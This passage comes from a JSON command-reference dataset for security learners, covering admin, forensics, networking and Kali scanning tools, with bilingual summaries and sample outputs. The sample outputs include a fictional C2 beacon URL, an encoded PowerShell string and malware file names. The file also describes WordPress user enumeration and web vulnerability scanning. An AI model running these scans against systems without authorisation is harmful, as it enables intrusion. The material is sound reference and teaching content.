        "desc": "Filter by priority (err, warning, notice, info)"
      },
      {
        "flag": "--since \"1 hour ago\"",
        "desc": "Show logs generated within specified time window"
      }
    ],
    "example": "journalctl -u ssh -n 50 --no-pager",
    "outputSample": "Sep 30 11:42:01 server sshd[4190]: Failed password for invalid user admin from 192.168.1.100 port 51234 ssh2\nSep 30 11:42:04 server sshd[4190]: Connection closed by authenticating user admin 192.168.1.100 [preauth]"
  },
  {
    "id": "it-03",
    "cmd": "chmod",
    "syntax": "chmod [options] <mode> <file_or_dir>",
    "category": "it",
    "subCategory": "File Permissions & Hardening",
    "level": "Essential",
    "dangerLevel": "Admin",
    "summary": "Changes file and directory access permissions (Read, Write, Execute) for User, Group, and Others.",
    "summary_hi": "Files aur folders ke permissions (Read, Write, Execute) badalne aur secure karne ka command.",
    "options": [
      {
        "flag": "750 <file>",
        "desc": "Owner: rwx (7), Group: r-x (5), Others: no access (0)"
      },
      {
        "flag": "600 <file>",
        "desc": "Read and write for Owner only (mandatory for private SSH keys)"
      },
      {
        "flag": "+x <script>",
        "desc": "Add execution permission"
      },
      {
        "flag": "-R",
        "desc": "Apply permissions recursively to all subdirectories and files"
      }
    ],
    "example": "chmod 600 ~/.ssh/id_rsa",
    "outputSample": "-rw------- 1 cyberops cyberops 2602 Sep 30 10:00 /home/cyberops/.ssh/id_rsa"
  },
  {
    "id": "it-04",
    "cmd": "grep",
    "syntax": "grep [options] <pattern> [files]",
    "category": "it",
    "subCategory": "Pattern & Regex Searching",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Searches text and log files for lines matching regular expressions and prints matching results.",
    "summary_hi": "Files aur logs me se kisi bhi text, error ya IP address ko search karke nikaalne ka sabse useful command.",
    "options": [
      {
        "flag": "-i",
        "desc": "Case-insensitive search (matches lower and upper case)"
      },
      {
        "flag": "-r / -R",
        "desc": "Recursive search through all files in subdirectories"
      },
      {
        "flag": "-v",
        "desc": "Invert match (print lines that DO NOT match the pattern)"
      },
      {
        "flag": "-E",
        "desc": "Interpret pattern as Extended Regular Expression (ERE)"
      },
      {
        "flag": "-n",
        "desc": "Print line number along with matching line"
      }
    ],
    "example": "grep -i \"failed password\" /var/log/auth.log | head -n 5",
    "outputSample": "Sep 30 11:15:20 server sshd[1234]: Failed password for root from 192.168.1.80 port 43210 ssh2\nSep 30 11:15:22 server sshd[1235]: Failed password for root from 192.168.1.80 port 43212 ssh2"
  },
  {
    "id": "it-05",
    "cmd": "Windows: ipconfig",
    "syntax": "ipconfig [/all | /flushdns | /release | /renew]",
    "category": "it",
    "subCategory": "Windows Network Inspection",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Windows TCP/IP configuration utility. Displays all current TCP/IP network configuration values and refreshes DHCP and DNS settings.",
    "summary_hi": "Windows computer me IP address, Subnet Mask, Gateway, MAC address dekhne aur DNS cache clear karne ka tool.",
    "options": [
      {
        "flag": "/all",
        "desc": "Display full configuration information including MAC addresses and DNS servers"
      },
      {
        "flag": "/flushdns",
        "desc": "Purge DNS Resolver cache (resolves stale DNS resolution errors)"
      },
      {
        "flag": "/release",
        "desc": "Release active IPv4 address assigned by DHCP server"
      },
      {
        "flag": "/renew",
        "desc": "Renew IP lease from the DHCP server"
      }
    ],
    "example": "ipconfig /flushdns",
    "outputSample": "Windows IP Configuration\n\nSuccessfully flushed the DNS Resolver Cache."
  },
  {
    "id": "it-06",
    "cmd": "Windows: tasklist & taskkill",
    "syntax": "tasklist [/v] | taskkill [/f] [/pid <pid> | /im <image_name>]",
    "category": "it",
    "subCategory": "Windows Process Management",
    "level": "Core",
    "dangerLevel": "Admin",
    "summary": "Displays all running processes on Windows and terminates rogue or unresponsive applications by PID or process name.",
    "summary_hi": "Windows me chal rahe sabhi processes dekhne aur suspicious/virus processes ko force-close (kill) karne ka command.",
    "options": [
      {
        "flag": "tasklist /v",
        "desc": "Verbose output including window title and CPU time"
      },
      {
        "flag": "tasklist /fi \"STATUS eq running\"",
        "desc": "Filter running tasks"
      },
      {
        "flag": "taskkill /f /pid <PID>",
        "desc": "Forcefully terminate process by Process ID"
      },
      {
        "flag": "taskkill /f /im evil.exe",
        "desc": "Forcefully terminate all instances by executable image name"
      }
    ],
    "example": "taskkill /f /im malware.exe",
    "outputSample": "SUCCESS: The process \"malware.exe\" with PID 4820 has been terminated."
  },
  {
    "id": "it-07",
    "cmd": "Windows: sfc /scannow",
    "syntax": "sfc /scannow",
    "category": "it",
    "subCategory": "Windows System Integrity",
    "level": "Core",
    "dangerLevel": "Admin",
    "summary": "System File Checker. Scans the integrity of all protected Windows operating system files and replaces corrupted files with cached copies.",
    "summary_hi": "Windows OS ki sabhi system files ko scan karta hai aur corrupted ya virus se badli hui files ko repair karta hai.",
    "options": [
      {
        "flag": "/scannow",
        "desc": "Scans all protected system files and repairs files when possible"
      },
      {
        "flag": "/verifyonly",
        "desc": "Scans system files without performing any repair actions"
      }
    ],
    "example": "sfc /scannow",
    "outputSample": "Beginning system scan. This process will take some time.\nVerification 100% complete.\nWindows Resource Protection did not find any integrity violations."
  },
  {
    "id": "it-08",
    "cmd": "Windows: Test-NetConnection",
    "syntax": "Test-NetConnection -ComputerName <host> -Port <port>",
    "category": "it",
    "subCategory": "PowerShell Network Diagnostic",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "PowerShell native diagnostic tool. Combines ping, traceroute, and TCP port connectivity checks into a single command.",
    "summary_hi": "Windows PowerShell ka modern network tool jo port open hai ya nahi aur connectivity testing karta hai.",
    "options": [
      {
        "flag": "-ComputerName <host>",
        "desc": "Destination hostname or IP address"
      },
      {
        "flag": "-Port <port>",
        "desc": "Specific TCP port to test for listening state (e.g. 443, 3389)"
      },
      {
        "flag": "-TraceRoute",
        "desc": "Perform hop-by-hop route tracing"
      }
    ],
    "example": "Test-NetConnection -ComputerName 192.168.1.1 -Port 443",
    "outputSample": "ComputerName     : 192.168.1.1\nRemoteAddress    : 192.168.1.1\nRemotePort       : 443\nTcpTestSucceeded : True"
  },
  {
    "id": "for-01",
    "cmd": "dd (Disk Dump / Forensic Imager)",
    "syntax": "dd if=<source_device> of=<target_image> [options]",
    "category": "forensics",
    "subCategory": "Physical Forensic Imaging",
    "level": "Advanced",
    "dangerLevel": "Critical",
    "summary": "Performs raw bit-by-bit physical imaging of hard drives, USBs, and memory partitions without altering metadata.",
    "summary_hi": "Forensic investigations me hard disk ya memory ka bit-by-bit raw clone image banane ka standard tool.",
    "options": [
      {
        "flag": "if=/dev/sdb",
        "desc": "Input file / source drive device"
      },
      {
        "flag": "of=/evidence/image.raw",
        "desc": "Output file destination path"
      },
      {
        "flag": "bs=4096 / bs=64K",
        "desc": "Block size for reading and writing data chunks"
      },
      {
        "flag": "conv=noerror,sync",
        "desc": "Continue reading past bad sectors and pad missing bytes"
      },
      {
        "flag": "status=progress",
        "desc": "Display live transfer speed and byte counter"
      }
    ],
    "example": "dd if=/dev/sdb of=/evidence/usb_evidence.raw bs=64K conv=noerror,sync status=progress",
    "outputSample": "16777216000 bytes (17 GB, 16 GiB) copied, 120 s, 140 MB/s\n262144+0 records in\n262144+0 records out"
  },
  {
    "id": "for-02",
    "cmd": "sha256sum / md5sum",
    "syntax": "sha256sum <file_or_evidence>",
    "category": "forensics",
    "subCategory": "Chain of Custody & Hash Verification",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Computes cryptographic SHA-256 / MD5 message digests. Mandatory in cyber forensics to guarantee evidence integrity in court.",
    "summary_hi": "Evidence files ka unique digital fingerprint (cryptographic hash) calculate karta hai taaki court me evidence ki integrity proof ho sake.",
    "options": [
      {
        "flag": "<file>",
        "desc": "Calculate hash for specified file"
      },
      {
        "flag": "-c <hashfile.txt>",
        "desc": "Read SHA256 checksums from file and verify match against files"
      }
    ],
    "example": "sha256sum evidence_hdd.raw",
    "outputSample": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855  evidence_hdd.raw"
  },
  {
    "id": "for-03",
    "cmd": "volatility / vol3",
    "syntax": "vol -f <memory_dump> <plugin>",
    "category": "forensics",
    "subCategory": "Volatile RAM Forensics",
    "level": "Advanced",
    "dangerLevel": "Audit/Probe",
    "summary": "Leading memory forensics framework. Extracts running processes, open network sockets, injected DLLs, and malware from RAM dumps.",
    "summary_hi": "Computer ki RAM memory dump se virus, hidden processes, browser history aur passwords extract karne ka forensics tool.",
    "options": [
      {
        "flag": "windows.pslist",
        "desc": "Enumerate all active processes present in memory during acquisition"
      },
      {
        "flag": "windows.netscan",
        "desc": "Scan memory for established and listening network sockets"
      },
      {
        "flag": "windows.malfind",
        "desc": "Locate memory sections with executable permissions and injected shellcode"
      },
      {
        "flag": "windows.cmdline",
        "desc": "Display command line arguments passed to executed processes"
      }
    ],
    "example": "vol -f ram_capture.raw windows.malfind",
    "outputSample": "PID   Process     Start VPN          End VPN            Tag\n2404  svchost.exe 0x0000021c32000000 0x0000021c32010000 VadS\nHexDump:\n0x0000021c32000000  4d 5a 90 00 03 00 00 00  ... MZ (Hidden Executable Detected)"
  },
  {
    "id": "for-04",
    "cmd": "strings",
    "syntax": "strings [options] <binary_or_dump>",
    "category": "forensics",
    "subCategory": "Binary String Extraction",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Extracts human-readable ASCII and Unicode text strings from binary executables, RAM dumps, and raw disk images.",
    "summary_hi": "Kisi bhi binary file, malware ya memory dump me se human-readable text (jaise URLs, passwords, IP addresses) nikaalta hai.",
    "options": [
      {
        "flag": "-a",
        "desc": "Scan the entire file, not just default data sections"
      },
      {
        "flag": "-n <length>",
        "desc": "Specify minimum string character length (default 4, recommended 8)"
      },
      {
        "flag": "-t x",
        "desc": "Print hex byte offset of each string within file"
      }
    ],
    "example": "strings -a -n 8 suspect_malware.exe | grep -iE \"http|powershell|c2\"",
    "outputSample": "http://malicious-c2-portal.xyz/api/beacon\npowershell.exe -enc SQBFAFgA...\nC:\\Windows\\System32\\cmd.exe"
  },
  {
    "id": "for-05",
    "cmd": "exiftool",
    "syntax": "exiftool [options] <file>",
    "category": "forensics",
    "subCategory": "Metadata Analysis",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Reads, writes, and analyzes metadata from images, PDFs, Word documents, and multimedia files (GPS, camera models, author info).",
    "summary_hi": "Photos, PDFs aur documents ka hidden metadata (GPS location, camera model, author name, creation date) inspect karta hai.",
    "options": [
      {
        "flag": "<file>",
        "desc": "Dump all metadata tags in human-readable format"
      },
      {
        "flag": "-gps:all",
        "desc": "Extract exclusively GPS latitude, longitude, and altitude tags"
      },
      {
        "flag": "-all=",
        "desc": "Strip all metadata tags from file for privacy hardening"
      }
    ],
    "example": "exiftool -a -u -g1 suspect_photo.jpg",
    "outputSample": "---- IFD0 ----\nCamera Model Name               : iPhone 14 Pro\nDate/Time Original              : 2026:09:28 14:22:10\nGPS Latitude                    : 28 deg 36' 48.12\" N\nGPS Longitude                   : 77 deg 12' 31.45\" E"
  },
  {
    "id": "for-06",
    "cmd": "foremost",
    "syntax": "foremost [options] -i <image_or_drive>",
    "category": "forensics",
    "subCategory": "Carving Deleted Files",
    "level": "Advanced",
    "dangerLevel": "Safe",
    "summary": "Data carving program that recovers lost or deleted files based on their internal file headers, footers, and data structures.",
    "summary_hi": "Formatted ya corrupted hard drive se deleted photos, PDFs aur documents ko unke header-footer structure se recover karta hai.",
    "options": [
      {
        "flag": "-i <file>",
        "desc": "Specify input disk image or partition"
      },
      {
        "flag": "-o <dir>",
        "desc": "Output directory for carved files"
      },
      {
        "flag": "-t <types>",
        "desc": "Specify file types to carve (jpg, pdf, docx, zip, exe)"
      },
      {
        "flag": "-v",
        "desc": "Verbose mode"
      }
    ],
    "example": "foremost -t jpg,pdf,docx -i /dev/sdb1 -o /evidence/carved_files/",
    "outputSample": "Foremost version 1.5.7 by Jesse Kornblum, Kris Kendall, and Nick Mikus\nAudit File\nFile: /dev/sdb1\nStart: Wed Sep 30 12:00:00 2026\nForemost finished: 42 jpg files, 15 pdf files carved."
  },
  {
    "id": "for-07",
    "cmd": "binwalk",
    "syntax": "binwalk [options] <firmware_file>",
    "category": "forensics",
    "subCategory": "Firmware Extraction",
    "level": "Advanced",
    "dangerLevel": "Safe",
    "summary": "Firmware analysis and extraction tool. Scans binary images for embedded file systems, compressed archives, and crypto keys.",
    "summary_hi": "IoT devices aur routers ke firmware ko analyze karke uske andar ke chhupe Linux file system aur credentials extract karta hai.",
    "options": [
      {
        "flag": "-e / --extract",
        "desc": "Automatically extract known file types found inside binary"
      },
      {
        "flag": "-M / --matryoshka",
        "desc": "Recursively scan and extract discovered files"
      },
      {
        "flag": "-B / --signature",
        "desc": "Scan target file for common file signatures"
      }
    ],
    "example": "binwalk -e router_firmware.bin",
    "outputSample": "DECIMAL       HEXADECIMAL     DESCRIPTION\n-------------------------------------------------------------------------\n0             0x0             TRX firmware header, total size: 8432100\n128           0x80            gzip compressed data, maximum compression\n2457600       0x258000        Squashfs filesystem, little endian, version 4.0"
  },
  {
    "id": "for-08",
    "cmd": "fls (The Sleuth Kit)",
    "syntax": "fls [options] <image_file> [inode]",
    "category": "forensics",
    "subCategory": "File System Inode Analysis",
    "level": "Advanced",
    "dangerLevel": "Safe",
    "summary": "Lists file and directory names in an image and displays allocated and deleted (carvable) inodes in the filesystem.",
    "summary_hi": "Forensic image me maujood active aur deleted files ke inodes aur structure ko list karta hai.",
    "options": [
      {
        "flag": "-r",
        "desc": "Recursively display directories"
      },
      {
        "flag": "-p",
        "desc": "Display full path for each directory"
      },
      {
        "flag": "-d",
        "desc": "Display deleted entries only"
      },
      {
        "flag": "-m <dir>",
        "desc": "Output in bodyfile format for mactime timeline generation"
      }
    ],
    "example": "fls -r -d -m / evidence.raw > deleted_bodyfile.txt",
    "outputSample": "d/d * 14209:  /Users/admin/AppData/Local/Temp/mimikatz.exe\n-/r * 14210:  /Users/admin/Desktop/confidential_data.xlsx"
  },
  {
    "id": "for-09",
    "cmd": "mactime (Timeline Analysis)",
    "syntax": "mactime -b <bodyfile> [options] [date_range]",
    "category": "forensics",
    "subCategory": "Chronological Timeline",
    "level": "Advanced",
    "dangerLevel": "Safe",
    "summary": "Creates a chronological timeline of file Modified, Accessed, and Created (MAC) events from a Sleuth Kit bodyfile.",
    "summary_hi": "Cyber attack ke dauran kaunsi file kab modify hui, kab access hui, uska time-by-time chronological sequence banata hai.",
    "options": [
      {
        "flag": "-b <bodyfile>",
        "desc": "Specify body file generated by fls"
      },
      {
        "flag": "-d",
        "desc": "Output in CSV spreadsheet format"
      },
      {
        "flag": "-z <timezone>",
        "desc": "Set time zone (e.g. UTC, Asia/Kolkata)"
      }
    ],
    "example": "mactime -b bodyfile.txt -d 2026-09-01..2026-09-30 > timeline.csv",
    "outputSample": "Date,Size,Type,Mode,UID,GID,Meta,File Name\n2026-09-28 14:10:02,45020,m.c,rw-r--r--,1000,1000,1402,/tmp/.hidden_script.sh\n2026-09-28 14:11:15,124000,mac,rwxr-xr-x,0,0,1405,/usr/local/bin/backdoor"
  },
  {
    "id": "for-10",
    "cmd": "chkrootkit / rkhunter",
    "syntax": "chkrootkit [options] | rkhunter --check [options]",
    "category": "forensics",
    "subCategory": "Rootkit & Backdoor Hunting",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Locally scans Linux system binaries, kernel modules, and interfaces for signatures of known rootkits, trojans, and malicious hooks.",
    "summary_hi": "Linux machine me secretly chhupe huye rootkits, backdoor modules aur modified binaries ko scan karke pakadta hai.",
    "options": [
      {
        "flag": "-q",
        "desc": "chkrootkit: Quiet mode, outputs only infected/warning lines"
      },
      {
        "flag": "--check --sk",
        "desc": "rkhunter: Run check and skip interactive keypress prompts"
      },
      {
        "flag": "--update",
        "desc": "rkhunter: Update rootkit signature definitions database"
      }
    ],
    "example": "rkhunter --check --sk",
    "outputSample": "[+] System checks summary\nFile properties checks...\n    Files checked: 142\n    Suspect files: 0\nRootkit checks...\n    Rootkits checked: 498\n    Possible rootkits: 0"
  },
  {
    "id": "net-13",
    "cmd": "iperf3",
    "syntax": "iperf3 -s [options] (Server) | iperf3 -c <server_ip> [options] (Client)",
    "category": "networking",
    "subCategory": "Bandwidth & Throughput Testing",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Active benchmark tool for measuring maximum achievable network bandwidth on IP networks (TCP, UDP, SCTP).",
    "summary_hi": "Do computers ke beech actual network speed, bandwidth aur jitter calculate karne ka speedtest tool.",
    "options": [
      {
        "flag": "-s",
        "desc": "Run in server listening mode"
      },
      {
        "flag": "-c <server>",
        "desc": "Run in client mode, connecting to iperf3 server"
      },
      {
        "flag": "-t <seconds>",
        "desc": "Time in seconds to transmit for (default 10 secs)"
      },
      {
        "flag": "-u",
        "desc": "Use UDP rather than TCP for throughput testing"
      }
    ],
    "example": "iperf3 -c 192.168.1.10 -t 10",
    "outputSample": "[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec  1.09 GBytes   940 Mbits/sec    0             sender\n[  5]   0.00-10.00  sec  1.09 GBytes   937 Mbits/sec                  receiver"
  },
  {
    "id": "kali-13",
    "cmd": "nikto",
    "syntax": "nikto -h <target_host> [options]",
    "category": "kali",
    "subCategory": "Web Server Vulnerability Scanner",
    "level": "Core",
    "dangerLevel": "Audit/Probe",
    "summary": "Web server scanner that tests for over 6,700 potentially dangerous files, outdated server software, and security misconfigurations.",
    "summary_hi": "Web server par 6700 se zyada common vulnerabilities, dangerous files aur outdated software ko scan karta hai.",
    "options": [
      {
        "flag": "-h <host>",
        "desc": "Target host name or IP address"
      },
      {
        "flag": "-ssl",
        "desc": "Force SSL/TLS mode on port"
      },
      {
        "flag": "-p <port>",
        "desc": "Port number to target (e.g. 80, 443, 8080)"
      },
      {
        "flag": "-Tuning <type>",
        "desc": "Scan tuning (1 = info, 2 = misconfig, 9 = SQLi)"
      }
    ],
    "example": "nikto -h https://target.local -ssl",
    "outputSample": "- Nikto v2.5.0\n+ Target Host: target.local\n+ Target Port: 443\n+ Server: Apache/2.4.41 (Ubuntu)\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ OSVDB-3092: /admin/: This might be interesting..."
  },
  {
    "id": "kali-14",
    "cmd": "wpscan",
    "syntax": "wpscan --url <target_url> [options]",
    "category": "kali",
    "subCategory": "WordPress Security Scanner",
    "level": "Core",
    "dangerLevel": "Audit/Probe",
    "summary": "Black-box WordPress security scanner. Detects vulnerable WordPress plugins, active themes, and enumerates usernames.",
    "summary_hi": "WordPress websites me vulnerabilities, vulnerable plugins aur usernames ko enumerate karne ka scanner.",
    "options": [
      {
        "flag": "--url <URL>",
        "desc": "Target WordPress site URL"
      },
      {
        "flag": "-e vp,vt,u",
        "desc": "Enumerate vulnerable plugins (vp), vulnerable themes (vt), and users (u)"
      },
      {
        "flag": "--api-token <token>",
        "desc": "WPScan vulnerability database API token for full CVE database"
      }
    ],
    "example": "wpscan --url https://target.local -e u,vp",
    "outputSample": "[+] WordPress version 6.2.2 identified\n[+] Enumerating Usernames ...\n[+] Identified 2 usernames:\n | [!] admin\n | [!] webmaster"
  },
  {
    "id": "net-14",
    "cmd": "nslookup",
    "syntax": "nslookup [options] <domain_or_ip> [dns_server]",
    "category": "networking",
    "subCategory": "Name Resolution",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Queries Internet domain name servers interactively to resolve hostnames to IP addresses and reverse lookups.",
    "summary_hi": "Domain name servers (DNS) se pooch kar kisi website ka IP address ya IP ka domain name check karta hai.",
    "options": [
      {
        "flag": "-type=<record>",
        "desc": "Specify DNS record type: A, AAAA, MX, TXT, NS, SOA"
      },
      {
        "flag": "server <ip>",
        "desc": "Direct query to a specific DNS server (e.g. 8.8.8.8, 1.1.1.1)"
      },
      {
        "flag": "-debug",
        "desc": "Display full packet debugging info including headers and flags"
      }
    ],
    "example": "nslookup -type=MX google.com 8.8.8.8",
    "outputSample": "Server:  dns.google\nAddress:  8.8.8.8\n\ngoogle.com  mail exchanger = 10 smtp.google.com."
  },
  {
    "id": "net-15",
    "cmd": "arp",
    "syntax": "arp [options] [ip_address]",
    "category": "networking",
    "subCategory": "Layer-2 Resolution",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Displays and modifies the Address Resolution Protocol (ARP) cache table mapping Layer 3 IP to Layer 2 MAC addresses.",
    "summary_hi": "Local network me IP address ko computer ke physical hardware (MAC) address se map karne wali ARP table dikhata hai.",
    "options": [
      {
        "flag": "-a",
        "desc": "Display current ARP table entries for all interfaces"
      },
      {
        "flag": "-d <ip>",
        "desc": "Delete a specific cached ARP entry (requires admin/root)"
      },
      {
        "flag": "-s <ip> <mac>",
        "desc": "Add a static, permanent ARP mapping to prevent ARP spoofing"
      }
    ],
    "example": "arp -a",
    "outputSample": "Interface: 192.168.1.100\n  Internet Address      Physical Address      Type\n  192.168.1.1           00-15-5d-01-ca-12     dynamic\n  192.168.1.255         ff-ff-ff-ff-ff-ff     static"
  },
  {
    "id": "net-16",
    "cmd": "route",
    "syntax": "route [options] [add|del] [target] [gw <gateway>]",
    "category": "networking",
    "subCategory": "Kernel Routing",
    "level": "Core",
    "dangerLevel": "Safe / Admin",
    "summary": "Manipulates the IP routing tables. Used to set up static routes to specific hosts or networks via an interface.",
    "summary_hi": "Computer ki routing table check aur modify karta hai ki packets kis gateway ya router se hokar jayenge.",
    "options": [
      {
        "flag": "-n",
        "desc": "Show numerical addresses instead of trying to determine symbolic host names"
      },
      {
        "flag": "print",
        "desc": "Windows: Display IPv4 and IPv6 active route tables"
      },
      {
        "flag": "add -net <net> gw <gw>",
        "desc": "Add static route for a destination network via gateway"
      }
    ],
    "example": "route -n",
    "outputSample": "Destination     Gateway         Genmask         Flags Metric Ref    Use Iface\n0.0.0.0         192.168.1.1     0.0.0.0         UG    100    0        0 eth0\n192.168.1.0     0.0.0.0         255.255.255.0   U     100    0        0 eth0"
  },
  {
    "id": "net-17",
    "cmd": "wget",
    "syntax": "wget [options] <URL>",
    "category": "networking",
    "subCategory": "File Retrieval",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Non-interactive network downloader supporting HTTP, HTTPS, and FTP protocols. Resumes aborted downloads and recurses directories.",
    "summary_hi": "Terminal se kisi bhi web link se file ya script download karne ka sabse reliable tool.",
    "options": [
      {
        "flag": "-c / --continue",
        "desc": "Resume a partially downloaded file"
      },
      {
        "flag": "-O <file>",
        "desc": "Write output directly to specified file path"
      },
      {
        "flag": "-b / --background",
        "desc": "Go to background immediately after startup"
      },
      {
        "flag": "--no-check-certificate",
        "desc": "Don't validate SSL certificate"
      }
    ],
    "example": "wget -c https://example.com/tool.tar.gz -O /opt/tool.tar.gz",
    "outputSample": "Saving to: '/opt/tool.tar.gz'\n100%[===================>] 14,892,104  12.4MB/s   in 1.2s"
  },
  {
    "id": "net-18",
    "cmd": "ethtool",
    "syntax": "ethtool [options] <interface_name>",
    "category": "networking",
    "subCategory": "Hardware NIC Auditing",
    "level": "Advanced",
    "dangerLevel": "Safe",
    "summary": "Queries and controls network driver and hardware settings, particularly for wired Ethernet devices (link speed, duplex, offloading).",
    "summary_hi": "Ethernet cable aur network card (NIC) ki actual speed (100Mbps vs 1Gbps), duplex mode aur physical link status check karta hai.",
    "options": [
      {
        "flag": "<iface>",
        "desc": "Display current speed, duplex mode, and link status"
      },
      {
        "flag": "-i <iface>",
        "desc": "Display driver information, firmware version, and bus location"
      },
      {
        "flag": "-S <iface>",
        "desc": "Query and display detailed adapter statistics and drop counters"
      }
    ],
    "example": "ethtool eth0",
    "outputSample": "Settings for eth0:\n\tSpeed: 1000Mb/s\n\tDuplex: Full\n\tPort: Twisted Pair\n\tLink detected: yes"
  },
  {
    "id": "net-19",
    "cmd": "mtr (My Traceroute)",
    "syntax": "mtr [options] <hostname_or_ip>",
    "category": "networking",
    "subCategory": "Live Latency Diagnostics",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Combines the functionality of traceroute and ping into a single network diagnostic tool that continuously polls routing hops.",
    "summary_hi": "Traceroute aur ping ka powerful combination jo har hop par real-time packet loss aur jitter calculate karta rehta hai.",
    "options": [
      {
        "flag": "-r / --report",
        "desc": "Generate a clean text report and exit after specified cycles"
      },
      {
        "flag": "-c <count>",
        "desc": "Set number of pings sent to each hop (default 10)"
      },
      {
        "flag": "-n / --no-dns",
        "desc": "Display numeric IP addresses without resolving hostnames"
      }
    ],
    "example": "mtr -r -c 10 1.1.1.1",
    "outputSample": "HOST: sec-workstation     Loss%   Snt   Last   Avg  Best  Wrst StDev\n  1.|-- 192.168.1.1       0.0%    10    1.2   1.1   0.9   1.5   0.2\n  2.|-- 1.1.1.1           0.0%    10   12.4  12.1  11.8  13.2   0.4"
  },
  {
    "id": "net-20",
    "cmd": "iptables",
    "syntax": "iptables -t <table> -<action> <chain> [rule-specification]",
    "category": "networking",
    "subCategory": "Stateful Packet Filtering",
    "level": "Advanced",
    "dangerLevel": "Admin / Critical",
    "summary": "Linux kernel stateful packet filter and NAT controller. Inspects, alters, and drops packets based on port, IP, and state.",
    "summary_hi": "Linux ka main firewall jo packet filtering, port blocking aur NAT rules enforce karta hai.",
    "options": [
      {
        "flag": "-L -n -v",
        "desc": "List all active firewall rules numerically with packet counters"
      },
      {
        "flag": "-A INPUT -p tcp --dport 22 -j ACCEPT",
        "desc": "Append rule: allow inbound SSH connections"
      },
      {
        "flag": "-P INPUT DROP",
        "desc": "Set default policy to drop all incoming packets not explicitly allowed"
      },
      {
        "flag": "-F",
        "desc": "Flush (clear) all active rules in selected table"
      }
    ],
    "example": "iptables -L -n -v",
    "outputSample": "Chain INPUT (policy DROP 12 packets, 720 bytes)\n pkts bytes target     prot opt in     out     source               destination\n 1204  140K ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0\n  450 38000 ACCEPT     tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            tcp dpt:22"
  },
  {
    "id": "net-21",
    "cmd": "ufw (Uncomplicated Firewall)",
    "syntax": "ufw [options] [command]",
    "category": "networking",
    "subCategory": "Host Firewall",
    "level": "Core",
    "dangerLevel": "Admin",
    "summary": "Simplified front-end for iptables designed for easy firewall management on Ubuntu and Debian distributions.",
    "summary_hi": "Ubuntu/Debian me firewall manage karne ka aasan tool - Ports block aur allow karne ke simple commands.",
    "options": [
      {
        "flag": "status verbose",
        "desc": "Check if firewall is active and list active port rules"
      },
      {
        "flag": "enable / disable",
        "desc": "Turn firewall on or off at system boot"
      },
      {
        "flag": "allow 22/tcp",
        "desc": "Permit inbound SSH traffic"
      },
      {
        "flag": "deny 3389",
        "desc": "Block inbound Remote Desktop (RDP) traffic"
      }
    ],
    "example": "ufw status verbose",
    "outputSample": "Status: active\nLogging: on (low)\nDefault: deny (incoming), allow (outgoing)\nTo                         Action      From\n--                         ------      ----\n22/tcp                     ALLOW IN    Anywhere"
  },
  {
    "id": "net-22",
    "cmd": "ssh",
    "syntax": "ssh [options] [user@]hostname [command]",
    "category": "networking",
    "subCategory": "Secure Remote Access",
    "level": "Essential",
    "dangerLevel": "Safe / Auth",
    "summary": "OpenSSH secure client. Authenticates and encrypts remote shell access, command execution, and port forwarding.",
    "summary_hi": "Encrypted tunnel ke zariye kisi remote Linux server me secure login karne ka universal tool.",
    "options": [
      {
        "flag": "-p <port>",
        "desc": "Connect to non-standard SSH port (default 22)"
      },
      {
        "flag": "-i <key_file>",
        "desc": "Specify private RSA/Ed25519 identity key file"
      },
      {
        "flag": "-L <local_port>:<remote_host>:<remote_port>",
        "desc": "Local port forwarding (tunnel remote port to localhost)"
      },
      {
        "flag": "-D <port>",
        "desc": "Dynamic application-level port forwarding (SOCKS5 proxy)"
      }
    ],
    "example": "ssh -i ~/.ssh/id_ed25519 root@192.168.1.50 -p 2222",
    "outputSample": "Authenticated to 192.168.1.50 ([192.168.1.50]:2222) using \"id_ed25519\".\nLinux srv-dc01 6.5.0-generic #1 SMP x86_64\nroot@srv-dc01:~# "
  },
  {
    "id": "net-23",
    "cmd": "scp",
    "syntax": "scp [options] [[user@]host1:]file1 ... [[user@]host2:]file2",
    "category": "networking",
    "subCategory": "Secure File Transfer",
    "level": "Essential",
    "dangerLevel": "Safe",
    "summary": "Securely copies files and directories between hosts over an encrypted SSH connection.",
    "summary_hi": "SSH encryption ka use karke do computers ke beech file aur folder transfer karta hai.",
    "options": [
      {
        "flag": "-r",
        "desc": "Recursively copy entire directories"
      },
      {
        "flag": "-P <port>",
        "desc": "Specify remote host SSH port"
      },
      {
        "flag": "-i <key_file>",
        "desc": "Specify identity key for authentication"
      },
      {
        "flag": "-C",
        "desc": "Enable on-the-fly compression for faster transfer"
      }
    ],
    "example": "scp -P 22 -r /var/log/syslog analyst@10.0.0.5:/evidence/",
    "outputSample": "syslog                       100%   12MB  24.2MB/s   00:00"
  },
  {
    "id": "net-24",
    "cmd": "rsync",
    "syntax": "rsync [options] source destination",
    "category": "networking",
    "subCategory": "Differential Synchronization",
    "level": "Core",
    "dangerLevel": "Safe",
    "summary": "Extremely fast differential file copy tool. Transfers only the modified bytes of changed files across local and remote paths.",
    "summary_hi": "Smart backup aur sync tool jo sirf wahi data transfer karta hai jo change hua ho.",
    "options": [
      {
        "flag": "-a / --archive",
        "desc": "Archive mode (preserves permissions, owners, timestamps, symlinks)"
      },
      {
        "flag": "-v / --verbose",
        "desc": "Verbose output listing synchronized files"
      },
      {
        "flag": "-z / --compress",
        "desc": "Compress data during transfer"
      },
      {
        "flag": "--progress",
        "desc": "Show real-time transfer speed and progress bar"
      },
      {
        "flag": "--delete",
        "desc": "Delete extraneous files from destination directory"
      }
    ],
    "example": "rsync -avz --progress /data/ root@backup.local:/backups/data/",
